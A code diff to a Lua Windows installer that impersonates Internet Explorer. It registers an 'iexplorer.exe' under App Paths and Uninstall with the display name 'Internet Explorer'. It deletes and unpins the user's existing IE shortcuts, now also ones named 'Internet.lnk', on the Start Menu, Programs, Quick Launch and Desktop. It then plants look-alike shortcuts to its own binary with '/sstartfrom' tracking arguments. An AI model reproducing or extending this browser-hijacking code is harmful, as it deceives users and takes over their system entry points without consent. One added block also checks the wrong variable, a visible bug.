@@ -539,7 +539,10 @@ function WriteIERegister()
 	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\InstallTimes", strCurrentTime)
 	
 	-------
-	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplorer.exe", strIEPath)
+	tipUtil:CreateRegKey("HKEY_LOCAL_MACHINE","Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplorer.exe")
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplorer.exe\\", strIEPath)
+	
+	tipUtil:CreateRegKey("HKEY_LOCAL_MACHINE","Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe")
 	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayName", "Internet Explorer")
 	
     local strUninstPath = tipUtil:PathCombine(strInstallDir, "uninst.exe")
@@ -632,10 +635,18 @@ function WriteStartMenuSC()
 		if IsRealString(strBaseDir) and tipUtil:QueryFileExists(strBaseDir) then
 		
 			local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
-			local bIsInDir = CheckIsIELnkInDir(strBaseDir)
+			local bIsInDir,strCurrent = CheckIsIELnkInDir(strBaseDir)
 			if bIsInDir then
-				tipUtil:PinToStartMenu4XP(strFilePath, false)
-				local bret = tipUtil:DeletePathFile(strFilePath)
+				tipUtil:PinToStartMenu4XP(strCurrent, false)
+				local bret = tipUtil:DeletePathFile(strCurrent)
+				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\STARTMENU", "1")
+			end
+			
+			local strFilePath1 = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
+			local bIsInDir1,strCurrent1 = CheckIsIELnkInDir(strBaseDir)
+			if bIsInDir then
+				tipUtil:PinToStartMenu4XP(strCurrent1, false)
+				local bret = tipUtil:DeletePathFile(strCurrent1)
 				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\STARTMENU", "1")
 			end
 			
@@ -662,9 +673,15 @@ function WriteStartMenuProgramSC()
 		if IsRealString(strBaseDir) and tipUtil:QueryFileExists(strBaseDir) then
 		
 			local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
-			local bIsInDir = CheckIsIELnkInDir(strBaseDir)
+			local bIsInDir,strCurrent = CheckIsIELnkInDir(strBaseDir)
 			if bIsInDir then
-				local bret = tipUtil:DeletePathFile(strFilePath)
+				local bret = tipUtil:DeletePathFile(strCurrent)
+				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\SMPROGRAMS", "1")
+			end
+			
+			local bIsInDir1,strCurrent1 = CheckIsIELnkInDir(strBaseDir)
+			if bIsInDir1 then
+				local bret = tipUtil:DeletePathFile(strCurrent1)
 				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\SMPROGRAMS", "1")
 			end
 			
@@ -685,12 +702,18 @@ function WriteQuickLaunchSC()
 	local strQueryDir = tipUtil:PathCombine(strBaseDir, "Microsoft\\Internet Explorer\\Quick Launch") 
 	if IsRealString(strQueryDir) and tipUtil:QueryFileExists(strQueryDir) then
 		local strFilePath = tipUtil:PathCombine(strQueryDir, "Internet Explorer.lnk")
-		local bIsInDir = CheckIsIELnkInDir(strQueryDir)
+		local bIsInDir,strCurrent = CheckIsIELnkInDir(strQueryDir)
 		if bIsInDir then
-			local bret = tipUtil:DeletePathFile(strFilePath)
+			local bret = tipUtil:DeletePathFile(strCurrent)
 			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\QUICKLAUNCH", "1")
 		end
-	
+		
+		local bIsInDir1,strCurrent1 = CheckIsIELnkInDir(strQueryDir)
+		if bIsInDir1 then
+			local bret = tipUtil:DeletePathFile(strCurrent1)
+			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\QUICKLAUNCH", "1")
+		end
+		
 		local strIEPath = GetIEPath()
 		local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strQueryDir, "", "/sstartfrom toolbar", "启动 Internet Explorer 浏览器")
 	end
@@ -708,16 +731,17 @@ function WriteDesktopSC()
 		local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCsidlDesktop)
 
 		local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
-		local bIsInDir = CheckIsIELnkInDir(strBaseDir)
+		local bIsInDir,strCurrent = CheckIsIELnkInDir(strBaseDir)
 		
 		if bIsInDir then
-			local bret = tipUtil:DeletePathFile(strFilePath)
+			local bret = tipUtil:DeletePathFile(strCurrent)
 			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\DESKTOP", "1")
 		end
 		
 		local strIEPath = GetIEPath()
 		if nCsidlDesktop == nCSIDL_DESKTOP then
 			local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strBaseDir, "", "/sstartfrom desktop", "启动 Internet Explorer 浏览器")
+			tipUtil:RefleshIcon(strFilePath)
 		end
 	end
 end
@@ -735,7 +759,7 @@ function CheckIsIELnkInDir(strDir)
 		local strFilePath = tFileList[i]
 		if IsRealString(strFilePath) and tipUtil:QueryFileExists(strFilePath) then
 			local  strFileName = FunctionObj.GetFileNameFromPath(strFilePath, true)
-			if string.find(tostring(strFileName),"Internet Explorer.lnk") then
+			if string.find(tostring(strFileName),"Internet Explorer.lnk") or string.find(tostring(strFileName),"Internet.lnk") then
 				return true, strFilePath
 			end
 		end
